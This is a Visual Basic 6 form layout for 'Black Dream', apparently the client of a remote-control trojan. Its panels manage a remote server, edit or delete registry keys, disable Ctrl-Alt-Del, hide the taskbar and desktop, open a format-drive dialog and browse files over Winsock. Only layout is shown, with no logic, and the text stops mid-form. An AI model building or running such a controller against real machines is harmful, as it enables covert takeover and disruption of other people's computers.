VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form FrmMain 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Black Dream"
   ClientHeight    =   5295
   ClientLeft      =   150
   ClientTop       =   150
   ClientWidth     =   6975
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "FrmMain.frx":0000
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5295
   ScaleWidth      =   6975
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox FrmDialog 
      Height          =   5295
      Index           =   1
      Left            =   0
      ScaleHeight     =   5235
      ScaleWidth      =   6915
      TabIndex        =   0
      Top             =   0
      Width           =   6975
      Begin VB.Frame FrmOptions 
         Caption         =   "About Black Dream Clent application"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   0
         Left            =   360
         TabIndex        =   2
         Top             =   960
         Width           =   6135
         Begin VB.PictureBox Picture1 
            AutoRedraw      =   -1  'True
            AutoSize        =   -1  'True
            BorderStyle     =   0  'None
            BeginProperty DataFormat 
               Type            =   2
               Format          =   "45444.3454"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   2057
               SubFormatType   =   9
            EndProperty
            Height          =   2625
            Left            =   960
            Picture         =   "FrmMain.frx":08CA
            ScaleHeight     =   2625
            ScaleWidth      =   4215
            TabIndex        =   3
            Top             =   360
            Width           =   4215
            Begin VB.Image Image21 
               Height          =   480
               Left            =   120
               Picture         =   "FrmMain.frx":42AD
               Top             =   2040
               Width           =   480
            End
         End
         Begin VB.Label Label26 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "If you do not agree to this term then please do not use the program."
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   150
            Left            =   1005
            TabIndex        =   27
            Top             =   3180
            Width           =   4020
         End
         Begin VB.Label Label25 
            Alignment       =   2  'Center
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "The designer is not responsible for any damage that may occure while using the program."
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   150
            Left            =   165
            TabIndex        =   26
            Top             =   3000
            Width           =   5820
            WordWrap        =   -1  'True
         End
         Begin VB.Label LblMail 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Click here to mail the designer:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   -1  'True
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FF0000&
            Height          =   195
            Left            =   3000
            TabIndex        =   7
            Top             =   3480
            Width           =   2205
         End
         Begin VB.Image CmdMail 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":4B77
            Top             =   3240
            Width           =   480
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Control options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   14
         Left            =   360
         TabIndex        =   231
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdViewControls 
            Caption         =   "&View"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   2760
            TabIndex        =   236
            Top             =   960
            Width           =   1095
         End
         Begin VB.CommandButton CmdEnableCtrlAltDel 
            Caption         =   "&Enable"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   2760
            TabIndex        =   234
            Top             =   360
            Width           =   1095
         End
         Begin VB.CommandButton CmdDisableCtrlAltDel 
            Caption         =   "&Disable"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   1560
            TabIndex        =   233
            Top             =   360
            Width           =   1095
         End
         Begin VB.Image Image29 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":5441
            Top             =   3240
            Width           =   480
         End
         Begin VB.Label Label82 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "For other controls click here:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   235
            Top             =   1080
            Width           =   2415
         End
         Begin VB.Label Label81 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Ctrl, Alt, Del:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   232
            Top             =   480
            Width           =   1035
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Registry options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   13
         Left            =   360
         TabIndex        =   214
         Top             =   960
         Width           =   6135
         Begin VB.TextBox TextGetValue 
            Height          =   285
            Left            =   720
            TabIndex        =   228
            Top             =   2280
            Width           =   3855
         End
         Begin VB.CommandButton CmdRegGet 
            Caption         =   "&Get"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   227
            Top             =   2280
            Width           =   1095
         End
         Begin VB.CommandButton CmdRegSet 
            Caption         =   "&Set"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   226
            Top             =   1680
            Width           =   1095
         End
         Begin VB.TextBox RegValueName 
            Height          =   285
            Left            =   1440
            TabIndex        =   225
            Top             =   1680
            Width           =   3135
         End
         Begin VB.TextBox EntryName 
            Height          =   285
            Left            =   1440
            TabIndex        =   224
            Top             =   1320
            Width           =   4335
         End
         Begin VB.TextBox RegPath 
            Height          =   285
            Left            =   1440
            TabIndex        =   221
            Top             =   960
            Width           =   4335
         End
         Begin VB.OptionButton RegOpt4 
            Caption         =   "Delete Key"
            Height          =   255
            Left            =   4800
            TabIndex        =   219
            Top             =   360
            Width           =   1095
         End
         Begin VB.OptionButton RegOpt3 
            Caption         =   "Create Key"
            Height          =   255
            Left            =   3480
            TabIndex        =   218
            Top             =   360
            Width           =   1215
         End
         Begin VB.OptionButton RegOpt2 
            Caption         =   "String"
            Height          =   255
            Left            =   2400
            TabIndex        =   217
            Top             =   360
            Value           =   -1  'True
            Width           =   975
         End
         Begin VB.OptionButton RegOpt1 
            Caption         =   "Binary"
            Height          =   255
            Left            =   1320
            TabIndex        =   216
            Top             =   360
            Width           =   975
         End
         Begin VB.OptionButton RegOpt0 
            Caption         =   "DWord"
            Height          =   255
            Left            =   240
            TabIndex        =   215
            Top             =   360
            Width           =   975
         End
         Begin VB.Label Label80 
            AutoSize        =   -1  'True
            Caption         =   "<=>"
            Height          =   195
            Left            =   240
            TabIndex        =   230
            Top             =   2280
            Width           =   360
         End
         Begin VB.Label Label12 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "If you have problems understanding the registry options please read the help documents."
            Height          =   390
            Left            =   360
            TabIndex        =   229
            Top             =   3000
            Width           =   4935
            WordWrap        =   -1  'True
         End
         Begin VB.Image Image28 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":5D0B
            Top             =   3240
            Width           =   480
         End
         Begin VB.Line Line2 
            X1              =   360
            X2              =   6000
            Y1              =   720
            Y2              =   720
         End
         Begin VB.Line Line1 
            X1              =   240
            X2              =   5880
            Y1              =   2160
            Y2              =   2160
         End
         Begin VB.Label Label79 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Entry name:"
            Height          =   195
            Left            =   360
            TabIndex        =   223
            Top             =   1320
            Width           =   885
         End
         Begin VB.Label Label78 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Value:"
            Height          =   195
            Left            =   360
            TabIndex        =   222
            Top             =   1680
            Width           =   450
         End
         Begin VB.Label Label24 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Registry path:"
            Height          =   195
            Left            =   360
            TabIndex        =   220
            Top             =   960
            Width           =   1035
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Server options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   1
         Left            =   360
         TabIndex        =   4
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdEndServer 
            Caption         =   "&End Server"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   240
            TabIndex        =   6
            Top             =   1680
            Width           =   1215
         End
         Begin VB.Image Image15 
            Height          =   480
            Left            =   1800
            Picture         =   "FrmMain.frx":65D5
            Top             =   1560
            Width           =   480
         End
         Begin VB.Image Image2 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":6E9F
            Top             =   3240
            Width           =   480
         End
         Begin VB.Label Label14 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   $"FrmMain.frx":7769
            Height          =   975
            Left            =   240
            TabIndex        =   5
            Top             =   480
            Width           =   5625
            WordWrap        =   -1  'True
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Run options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   12
         Left            =   360
         TabIndex        =   195
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdShowRunDialog 
            Caption         =   "Displ&ay"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4800
            TabIndex        =   212
            Top             =   2760
            Width           =   1095
         End
         Begin VB.TextBox TextRunDialogPrompt 
            Height          =   285
            Left            =   2520
            TabIndex        =   211
            Top             =   3120
            Width           =   1695
         End
         Begin VB.TextBox TextRunDialogTitle 
            Height          =   285
            Left            =   2520
            MaxLength       =   100
            TabIndex        =   209
            Top             =   2760
            Width           =   1695
         End
         Begin VB.CommandButton CmdFormatDialog 
            Caption         =   "Dis&play"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4800
            TabIndex        =   206
            Top             =   2280
            Width           =   1095
         End
         Begin VB.TextBox TextFormatDriveLetter 
            Height          =   285
            Left            =   3960
            MaxLength       =   1
            TabIndex        =   205
            Top             =   2280
            Width           =   735
         End
         Begin VB.CommandButton CmdIconChangeDialog 
            Caption         =   "&Display"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4800
            TabIndex        =   203
            Top             =   1800
            Width           =   1095
         End
         Begin VB.TextBox TextExecutableFile 
            Height          =   285
            Left            =   480
            TabIndex        =   202
            Top             =   1800
            Width           =   4215
         End
         Begin VB.CommandButton CmdOpenFindDialog 
            Caption         =   "&Open"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   1800
            TabIndex        =   200
            Top             =   960
            Width           =   1095
         End
         Begin VB.CommandButton CmdStartDocument 
            Caption         =   "&Start"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4800
            TabIndex        =   198
            Top             =   480
            Width           =   1095
         End
         Begin VB.TextBox TextStartDocument 
            Height          =   285
            Left            =   1800
            TabIndex        =   197
            Top             =   480
            Width           =   2895
         End
         Begin VB.Label Label77 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "If you require to run a program, look under the file browser options."
            Height          =   195
            Left            =   240
            TabIndex        =   213
            Top             =   3480
            Width           =   4905
         End
         Begin VB.Label Label76 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Prompt:"
            Height          =   195
            Left            =   1920
            TabIndex        =   210
            Top             =   3120
            Width           =   570
         End
         Begin VB.Label Label75 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Title:"
            Height          =   195
            Left            =   2040
            TabIndex        =   208
            Top             =   2760
            Width           =   360
         End
         Begin VB.Label Label74 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Display run dialog:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   207
            Top             =   2760
            Width           =   1545
         End
         Begin VB.Label Label73 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Display format drive dialog for (drive letter, ie c:\):"
            Height          =   195
            Left            =   240
            TabIndex        =   204
            Top             =   2280
            Width           =   3645
         End
         Begin VB.Label Label72 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Open exe icon change dialog for an executable file:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   201
            Top             =   1440
            Width           =   4275
         End
         Begin VB.Label Label71 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Open find dialog:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   199
            Top             =   960
            Width           =   1395
         End
         Begin VB.Image Image26 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":78A5
            Top             =   3240
            Width           =   480
         End
         Begin VB.Label Label70 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Start document:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   196
            Top             =   480
            Width           =   1380
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "Fun options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   11
         Left            =   360
         TabIndex        =   170
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdShowDesktopIcons 
            Caption         =   "Show"
            Height          =   375
            Left            =   5280
            TabIndex        =   187
            Top             =   960
            Width           =   735
         End
         Begin VB.CommandButton CmdHideDesktopIcons 
            Caption         =   "Hide"
            Height          =   375
            Left            =   4440
            TabIndex        =   186
            Top             =   960
            Width           =   735
         End
         Begin VB.CommandButton CmdShowToolbar 
            Caption         =   "Show"
            Height          =   375
            Left            =   5280
            TabIndex        =   185
            Top             =   360
            Width           =   735
         End
         Begin VB.CommandButton CmdHideToolbar 
            Caption         =   "Hide"
            Height          =   375
            Left            =   4440
            TabIndex        =   184
            Top             =   360
            Width           =   735
         End
         Begin VB.CommandButton CmdShowStartButton 
            Caption         =   "Show"
            Height          =   375
            Left            =   2280
            TabIndex        =   183
            Top             =   3360
            Width           =   735
         End
         Begin VB.CommandButton CmdHideStartButton 
            Caption         =   "Hide"
            Height          =   375
            Left            =   1440
            TabIndex        =   182
            Top             =   3360
            Width           =   735
         End
         Begin VB.CommandButton CmdShowProgramsinTB 
            Caption         =   "Show"
            Height          =   375
            Left            =   2280
            TabIndex        =   181
            Top             =   2760
            Width           =   735
         End
         Begin VB.CommandButton CmdHideProgramsinTB 
            Caption         =   "Hide"
            Height          =   375
            Left            =   1440
            TabIndex        =   180
            Top             =   2760
            Width           =   735
         End
         Begin VB.CommandButton CmdShowSysIcons 
            Caption         =   "Show"
            Height          =   375
            Left            =   2280
            TabIndex        =   179
            Top             =   2160
            Width           =   735
         End
         Begin VB.CommandButton CmdHideSysIcons 
            Caption         =   "Hide"
            Height          =   375
            Left            =   1440
            TabIndex        =   178
            Top             =   2160
            Width           =   735
         End
         Begin VB.CommandButton CmdShowClock 
            Caption         =   "Show"
            Height          =   375
            Left            =   2280
            TabIndex        =   177
            Top             =   1560
            Width           =   735
         End
         Begin VB.CommandButton CmdHideClock 
            Caption         =   "Hide"
            Height          =   375
            Left            =   1440
            TabIndex        =   176
            Top             =   1560
            Width           =   735
         End
         Begin VB.CommandButton CmdShowDesktop 
            Caption         =   "Show"
            Height          =   375
            Left            =   2280
            TabIndex        =   175
            Top             =   960
            Width           =   735
         End
         Begin VB.CommandButton CmdHideDesktop 
            Caption         =   "Hide"
            Height          =   375
            Left            =   1440
            TabIndex        =   174
            Top             =   960
            Width           =   735
         End
         Begin VB.CommandButton CmdShowTaskBar 
            Caption         =   "Show"
            Height          =   375
            Left            =   2280
            TabIndex        =   173
            Top             =   360
            Width           =   735
         End
         Begin VB.CommandButton CmdHideTaskBar 
            Caption         =   "Hide"
            Height          =   375
            Left            =   1440
            TabIndex        =   172
            Top             =   360
            Width           =   735
         End
         Begin VB.Image Image27 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":816F
            Top             =   3240
            Width           =   480
         End
         Begin VB.Label Label69 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Best way to (Desktop):"
            Height          =   390
            Left            =   3240
            TabIndex        =   194
            Top             =   960
            Width           =   1125
            WordWrap        =   -1  'True
         End
         Begin VB.Label Label68 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Best way to (Toolbar):"
            Height          =   390
            Left            =   3240
            TabIndex        =   193
            Top             =   360
            Width           =   1215
            WordWrap        =   -1  'True
         End
         Begin VB.Label Label67 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Start button:"
            Height          =   195
            Left            =   240
            TabIndex        =   192
            Top             =   3480
            Width           =   945
         End
         Begin VB.Label Label66 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Programs showing in T/B:"
            Height          =   390
            Left            =   240
            TabIndex        =   191
            Top             =   2760
            Width           =   1095
            WordWrap        =   -1  'True
         End
         Begin VB.Label Label65 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Systray icons:"
            Height          =   195
            Left            =   240
            TabIndex        =   190
            Top             =   2280
            Width           =   1020
         End
         Begin VB.Label Label64 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Clock:"
            Height          =   195
            Left            =   240
            TabIndex        =   189
            Top             =   1680
            Width           =   435
         End
         Begin VB.Label Label63 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Desktop:"
            Height          =   195
            Left            =   240
            TabIndex        =   188
            Top             =   1080
            Width           =   645
         End
         Begin VB.Label Label62 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Taskbar:"
            Height          =   195
            Left            =   240
            TabIndex        =   171
            Top             =   480
            Width           =   630
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "File / Directory properties"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   10
         Left            =   360
         TabIndex        =   162
         Top             =   960
         Width           =   6135
         Begin VB.CommandButton CmdBrowser 
            Caption         =   "&Browser"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   480
            TabIndex        =   164
            Top             =   840
            Width           =   1335
         End
         Begin VB.Label Label61 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   $"FrmMain.frx":8A39
            Height          =   585
            Left            =   240
            TabIndex        =   169
            Top             =   2520
            Width           =   5685
            WordWrap        =   -1  'True
         End
         Begin VB.Shape Shape2 
            FillStyle       =   0  'Solid
            Height          =   255
            Left            =   360
            Shape           =   3  'Circle
            Top             =   2160
            Width           =   135
         End
         Begin VB.Shape Shape1 
            FillStyle       =   0  'Solid
            Height          =   255
            Left            =   360
            Shape           =   3  'Circle
            Top             =   1800
            Width           =   135
         End
         Begin VB.Label Label60 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "File lists may not always show."
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   600
            TabIndex        =   168
            Top             =   2160
            Width           =   2580
         End
         Begin VB.Label Label59 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Possible errors with the file browser:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   167
            Top             =   1440
            Width           =   3075
         End
         Begin VB.Label Label58 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "You may find that some directorys might not open."
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   600
            TabIndex        =   166
            Top             =   1800
            Width           =   4305
         End
         Begin VB.Image Image25 
            Height          =   480
            Left            =   2040
            Picture         =   "FrmMain.frx":8B1C
            Top             =   840
            Width           =   480
         End
         Begin VB.Image Image24 
            Height          =   480
            Left            =   5400
            Picture         =   "FrmMain.frx":93E6
            Top             =   3240
            Width           =   480
         End
         Begin VB.Label Label57 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "You will find all file and directory functions in the browser."
            Height          =   195
            Left            =   240
            TabIndex        =   165
            Top             =   3480
            Width           =   4140
         End
         Begin VB.Label Label56 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Click here to enter the directory and file browsing tool:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   163
            Top             =   480
            Width           =   4605
         End
      End
      Begin VB.Frame FrmOptions 
         Caption         =   "System options"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3855
         Index           =   9
         Left            =   360
         TabIndex        =   143
         Top             =   960
         Width           =   6135
         Begin VB.TextBox ClassWindowName 
            Height          =   285
            Left            =   960
            Locked          =   -1  'True
            TabIndex        =   161
            Top             =   3480
            Width           =   2535
         End
         Begin VB.CommandButton CmdClearSystemTextCells 
            Caption         =   "Cl&ear Cells"
            Height          =   375
            Left            =   4680
            TabIndex        =   159
            Top             =   2400
            Width           =   1215
         End
         Begin VB.CommandButton CmdGetWindow 
            Caption         =   "&Get window"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   3600
            TabIndex        =   158
            Top             =   3120
            Width           =   1215
         End
         Begin VB.TextBox TextWindowName 
            Height          =   285
            Left            =   960
            Locked          =   -1  'True
            TabIndex        =   157
            Top             =   3120
            Width           =   2535
         End
         Begin VB.TextBox TextHwndWindow 
            Height          =   285
            Left            =   1680
            MaxLength       =   5
            TabIndex        =   154
            Top             =   2760
            Width           =   1815
         End
         Begin VB.CommandButton CmdCheckForSoundCard 
            Caption         =   "C&heck"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   152
            Top             =   1920
            Width           =   1215
         End
         Begin VB.CommandButton CmdAddtoDoc 
            Caption         =   "&Add to doc"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   150
            Top             =   1440
            Width           =   1215
         End
         Begin VB.TextBox TextDocumentAddfilename 
            Height          =   285
            Left            =   2280
            TabIndex        =   149
            Top             =   1440
            Width           =   2295
         End
         Begin VB.CommandButton CmdClearDocuments 
            Caption         =   "&Clear"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   147
            Top             =   960
            Width           =   1215
         End
         Begin VB.CommandButton CmdOpenSystemInfo 
            Caption         =   "&Open"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   4680
            TabIndex        =   145
            Top             =   480
            Width           =   1215
         End
         Begin VB.Label Label55 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Name:"
            Height          =   195
            Left            =   360
            TabIndex        =   160
            Top             =   3480
            Width           =   465
         End
         Begin VB.Label Label54 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Class:"
            Height          =   195
            Left            =   360
            TabIndex        =   156
            Top             =   3120
            Width           =   435
         End
         Begin VB.Label Label53 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Hwnd (Number):"
            Height          =   195
            Left            =   360
            TabIndex        =   155
            Top             =   2760
            Width           =   1185
         End
         Begin VB.Label Label52 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "Get window name:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   240
            TabIndex        =   153
            Top             =   2400
            Width           =   1545
         End
         Begin VB.Label Label51 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
